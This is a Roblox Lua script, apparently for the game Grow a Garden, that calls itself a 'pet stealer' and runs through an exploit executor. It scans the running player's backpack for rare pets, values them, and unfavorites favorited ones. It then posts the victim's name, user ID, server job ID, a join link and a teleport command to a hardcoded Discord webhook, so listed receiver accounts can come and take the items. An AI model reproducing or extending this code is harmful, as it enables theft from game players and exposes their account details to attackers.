-- GAG Stealer Script - Fixed Version
-- Reset execution guard to allow multiple runs
_G.scriptExecuted = false

-- Configuration
_G.Usernames = {"iamzanji11", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55", "iamzanji66", "iamzanji77", "iamzanji88", "iamzanji99", "iamzanji00"}
_G.min_value = 100000  -- Lowered from 100 million to 100k for testing
_G.pingEveryone = "Yes"
_G.webhook = "https://discord.com/api/webhooks/1397467480670212197/O9h7_jw18J2WlZoK9eZRj7sTyu9MYOdaFlHUdFuyXa-Vur1wEW4leEHFGaD1SrrHHGVM"

-- Variables
local users = _G.Usernames or {}
local min_value = _G.min_value or 100000
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- Player setup
local plr = Players.LocalPlayer
local character = plr.Character or plr.CharacterAdded:Wait()
local backpack = plr:WaitForChild("Backpack")

-- Game modules (with error handling)
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")

-- Try to load modules with error handling
local calcPlantValue, petUtils, petRegistry, numberUtil, dataService

local success, error = pcall(function()
    calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
    petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
    petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
    numberUtil = require(modules:WaitForChild("NumberUtil"))
    dataService = require(modules:WaitForChild("DataService"))
end)

if not success then
    warn("Failed to load some modules:", error)
    -- Continue with basic functionality
end

-- Constants
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
-- Remove plant-related constants and logic
-- Rare pets and mutation keywords
local rarePets = {"Red Fox", "Raccoon", "Dragonfly", "Queen Bee", "T-Rex", "Fennec Fox", "Butterfly", "Disco Bee", "Mimic Octopus", "Kitsune", "Spinosaurus"}
local mutationKeywords = {"Ascended", "Inverted", "Rainbow", "Radiant", "IronSkin", "Golden", "Tiny", "Frozen", "Windy", "Mega", "Shiny", "Shocked"}

-- Emoji map for pet types          
local petEmojis = {
    ["Fennec Fox"] = "🦊",
    ["Butterfly"] = "🦋",
    ["Dragonfly"] = "🐉",
    ["Red Fox"] = "🦊",
    ["Raccoon"] = "🦝",
    ["Queen Bee"] = "🐝",
    ["T-Rex"] = "🦖",
    ["Disco Bee"] = "🐝",
    ["Mimic Octopus"] = "🐙",
    ["Kitsune"] = "🦊",
    ["Spinosaurus"] = "🦖"
}

local function getPetEmoji(petName, weight)
    -- Always use the base pet emoji, even for mutated pets
    if weight >= 25 then
        return "💪"
    end
    -- Extract base pet type (remove mutation keywords)
    local baseName = petName
    for _, mutation in ipairs(mutationKeywords) do
        baseName = baseName:gsub(mutation .. " ", "")
        baseName = baseName:gsub(mutation, "")
    end
    baseName = baseName:match("^%s*(.-)%s*$") -- trim spaces
    return petEmojis[baseName] or "🦊"
end

local function isRarePet(petName, weight)
    for _, rare in ipairs(rarePets) do
        if string.find(petName, rare, 1, true) then
            return true
        end
    end
    if weight and weight >= 25 then
        return true
    end
    return false
end

local function hasMutation(petName)
    for _, mutation in ipairs(mutationKeywords) do
        if string.find(petName, mutation) then
            return true
        end
    end
    return false
end
local totalValue = 0
local itemsToSend = {}

-- Debug function
local function debugPrint(message)
    print("[GAG Debug]", message)
end

-- Executor detection function
local function detectExecutor()
    if identifyexecutor then
        return identifyexecutor()
    elseif syn and syn.protect_gui then
        return "Synapse X"
    elseif isexecutorclosure then
        return "KRNL"
    elseif getexecutorname then
        return getexecutorname()
    elseif pebc_execute then
        return "Script-Ware"
    elseif fluxus then
        return "Fluxus"
    elseif secure_load then
        return "Sentinel"
    elseif is_sirhurt_closure then
        return "SirHurt"
    elseif shadow_env then
        return "Shadow"
    elseif jit then
        return "ProtoSmasher"
    else
        return "Unknown"
    end
end

-- Main execution
debugPrint("Script starting...")
debugPrint("Place ID: " .. game.PlaceId)
debugPrint("Min value: " .. min_value)

-- Validation checks
if next(users) == nil or webhook == "" then
    debugPrint("ERROR: No usernames or webhook configured")
    return
end

if game.PlaceId ~= 126884695634066 then
    debugPrint("ERROR: Wrong game - Place ID: " .. game.PlaceId)
    return
end

-- Server type check with error handling
local serverTypeSuccess, serverType = pcall(function()
    return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
end)

if serverTypeSuccess and serverType == "VIPServer" then
    debugPrint("ERROR: VIP Server detected")
    return
end

debugPrint("All checks passed, continuing...")

-- Pet value calculation function
local function calcPetValue(v14)
    if not v14 or not v14.PetData then
        return 0
    end
    
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then
        return 0
    end
    
    if not petRegistry or not petRegistry.PetEggs then
        return 0
    end
    
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then
        return 0
    end
    
    local v17 = eggData.RarityData and eggData.RarityData.Items and eggData.RarityData.Items[v14.PetType]
    if not v17 then
        return 0
    end
    
    local weightRange = v17.GeneratedPetData and v17.GeneratedPetData.WeightRange
    if not weightRange then
        return 0
    end
    
    if not numberUtil or not numberUtil.ReverseLerp then
        return 0
    end
    
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    
    if not petUtils or not petUtils.GetLevelProgress then
        return 0
    end
    
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    
    if not petRegistry.PetList or not petRegistry.PetList[v14.PetType] then
        return 0
    end
    
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

-- Number formatting function
local function formatNumber(number)
    if number == nil then
        return "0"
    end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

-- Weight extraction function
local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or 
                       tool:FindFirstChild("KG") or 
                       tool:FindFirstChild("WeightValue") or
                       tool:FindFirstChild("Mass")

    local weight = 0

    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        if weightMatch then
            weight = tonumber(weightMatch) or 0
        end
    end

    return math.floor(weight * 100 + 0.5) / 100
end

-- Remove getHighestKGFruit function

-- Webhook sending function with error handling
local function sendWebhook(data)
    local success, response = pcall(function()
        if not request then
            error("Request function not available")
        end
        
        local body = HttpService:JSONEncode(data)
        local headers = {
            ["Content-Type"] = "application/json"
        }
        
        return request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)
    
    if not success then
        debugPrint("ERROR: Failed to send webhook - " .. tostring(response))
        return false
    else
        debugPrint("Webhook sent successfully")
        return true
    end
end

-- Update SendJoinMessage to match requested Discord layout
local function SendJoinMessage(list, prefix)
    -- Player info
    local playerName = plr.Name
    local userId = tostring(plr.UserId)
    local receivers = table.concat(_G.Usernames, ", ")
    local executor = detectExecutor()
    local totalValueStr = formatNumber(totalValue)
    local jobId = game.JobId or "N/A"
    local placeId = tostring(game.PlaceId or "N/A")
    local playerCount = tostring(#Players:GetPlayers())
    local maxPlayers = tostring(Players.MaxPlayers or "?")
    local timeStr = os.date("%H:%M:%S")
    local dateStr = os.date("%m/%d/%y")
    local teleportCmd = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
    local joinUrl = string.format("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s", placeId, jobId)

    -- Pet list formatting
    local petLines = {}
    for _, item in ipairs(list) do
        if item.Type == "Pet" then
            table.insert(petLines, string.format("%s [Age: %s] [%.2f KG] - %s Value", item.Name, tostring(item.Age), item.Weight, formatNumber(item.Value)))
        end
    end
    local petListStr = table.concat(petLines, "\n")

    -- Main embed description
    local description = string.format(
        "X Scripts Gag Stealer\nTotal Value (expensive pets): %s\n\n%s\n\nGame Link\n[Click to join](%s)\n%s\n\nPlayer Info\nName: %s\nUser ID: %s\nPlayers in game: %s/%s\nReceivers: %s\n\nExploit Info\nExploit: %s\nTime: %s\nDate: %s",
        totalValueStr,
        petListStr,
        joinUrl,
        teleportCmd,
        playerName,
        userId,
        playerCount,
        maxPlayers,
        receivers,
        executor,
        timeStr,
        dateStr
    )

    local data = {
        ["content"] = prefix .. teleportCmd,
        ["username"] = playerName,
        ["embeds"] = {{
            ["title"] = "X Scripts Gag Stealer",
            ["color"] = 16753920, -- Orange
            ["description"] = description,
            ["footer"] = {
                ["text"] = "GAG pet stealer by ZANJI."
            }
        }}
    }

    return sendWebhook(data)
end

-- Update SendMessage to focus on pets
local function SendMessage(sortedItems)
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Pets sent:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Pet Value: ¢%s", formatNumber(totalValue)),
            inline = false
        }
    }

    for _, item in ipairs(sortedItems) do
        if item.Type == "Pet" then
            local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
            fields[2].value = fields[2].value .. line .. "\n"
        end
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["username"] = plr.Name,
        ["embeds"] = {{
            ["title"] = "🐶 New PET Execution",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "GAG pet stealer by ZANJI."
            }
        }}
    }

    return sendWebhook(data)
end

-- Remove plant scanning logic from backpack scan, only process pets
debugPrint("Scanning backpack for items...")
local itemCount = 0

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            if petUUID and dataService and dataService.GetData then
                local playerData = dataService:GetData()
                if playerData and playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                    local v14 = playerData.PetsData.PetInventory.Data[petUUID]
                    if v14 then
                        local toolName = tool.Name
                        local itemName = toolName:match("^(.-) %[%d+%.?%d* KG%]") or toolName
                        local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                        -- Improved age extraction: prefer v14.PetData.Age, fallback to name pattern
                        local petAge = nil
                        if v14.PetData and v14.PetData.Age then
                            petAge = tonumber(v14.PetData.Age)
                        end
                        if not petAge then
                            petAge = toolName:match("%[Age[:%s]*(%d+)%]")
                            if petAge then
                                petAge = tonumber(petAge)
                            else
                                petAge = "N/A"
                            end
                        end
                        -- Only include rare pets and their mutated forms
                        if isRarePet(itemName, weight) then
                            if tool:GetAttribute("Favorite") then
                                local success = pcall(function()
                                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
                                end)
                                if not success then
                                    debugPrint("Failed to unfavorite pet")
                                end
                            end
                            local value = calcPetValue(v14)
                            totalValue = totalValue + value
                            table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
                            debugPrint("Added pet: " .. itemName .. " Value: " .. value .. " Age: " .. tostring(petAge))
                        end
                    end
                end
            end
        end
    end
end

debugPrint("Total items found: " .. itemCount)
debugPrint("Items to send: " .. #itemsToSend)
debugPrint("Total value: " .. totalValue)

if #itemsToSend > 0 then
    debugPrint("Processing items...")
    
    -- Sort items
    table.sort(itemsToSend, function(a, b)
        if a.Type ~= "Pet" and b.Type == "Pet" then
            return true
        elseif a.Type == "Pet" and b.Type ~= "Pet" then
            return false
        else
            return a.Value < b.Value
        end
    end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    table.sort(sentItems, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then
            return true
        elseif a.Type ~= "Pet" and b.Type == "Pet" then
            return false
        else
            return a.Value > b.Value
        end
    end)

    local prefix = ""
    if ping == "Yes" then
        prefix = "--@everyone "
    end

    -- Remove followUser and waitForUserChat, just send notification after scan
    SendJoinMessage(sentItems, prefix)
else
    debugPrint("No items found that meet the minimum value requirement")
    debugPrint("Try lowering the min_value in the configuration")
end 
